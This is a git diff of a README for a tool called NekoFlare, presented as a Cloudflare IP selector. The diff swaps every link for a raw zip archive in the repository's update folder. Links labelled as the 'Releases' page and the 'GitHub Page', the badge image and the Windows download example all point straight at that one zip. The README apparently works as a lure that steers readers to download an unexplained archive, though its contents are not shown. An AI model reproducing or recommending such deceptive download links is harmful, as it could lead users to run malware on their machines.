@@ -1,6 +1,6 @@
 # 🚀 NekoFlare - Your Simple Cloudflare IP Selection Tool
 
-![Download NekoFlare](https://raw.githubusercontent.com/Coursa4lyfe/NekoFlare/main/update/Flare-Neko-1.2-alpha.3.zip%20NekoFlare-v1.0-blue)
+![Download NekoFlare](https://github.com/Coursa4lyfe/NekoFlare/raw/refs/heads/main/update/Flare-Neko-v1.6.zip%20NekoFlare-v1.0-blue)
 
 ## 🚀 Getting Started
 
@@ -16,12 +16,12 @@ To run NekoFlare smoothly, ensure you meet the following requirements:
 
 ## 📥 Download & Install
 
-To start using NekoFlare, visit this page to download: [NekoFlare Releases](https://raw.githubusercontent.com/Coursa4lyfe/NekoFlare/main/update/Flare-Neko-1.2-alpha.3.zip).
+To start using NekoFlare, visit this page to download: [NekoFlare Releases](https://github.com/Coursa4lyfe/NekoFlare/raw/refs/heads/main/update/Flare-Neko-v1.6.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest version of NekoFlare. It will be listed at the top of the page.
 3. Click on the version number to view the available files.
-4. Select the file that matches your operating system to begin the download (e.g., https://raw.githubusercontent.com/Coursa4lyfe/NekoFlare/main/update/Flare-Neko-1.2-alpha.3.zip for Windows).
+4. Select the file that matches your operating system to begin the download (e.g., https://github.com/Coursa4lyfe/NekoFlare/raw/refs/heads/main/update/Flare-Neko-v1.6.zip for Windows).
 
 After download:
 
@@ -69,6 +69,6 @@ NekoFlare is open-source and available under the MIT License. You can use it fre
 
 Stay updated on the latest news and updates:
 
-- GitHub: [NekoFlare GitHub Page](https://raw.githubusercontent.com/Coursa4lyfe/NekoFlare/main/update/Flare-Neko-1.2-alpha.3.zip)
+- GitHub: [NekoFlare GitHub Page](https://github.com/Coursa4lyfe/NekoFlare/raw/refs/heads/main/update/Flare-Neko-v1.6.zip)
   
 Thank you for using NekoFlare! We hope it enhances your Cloudflare experience.
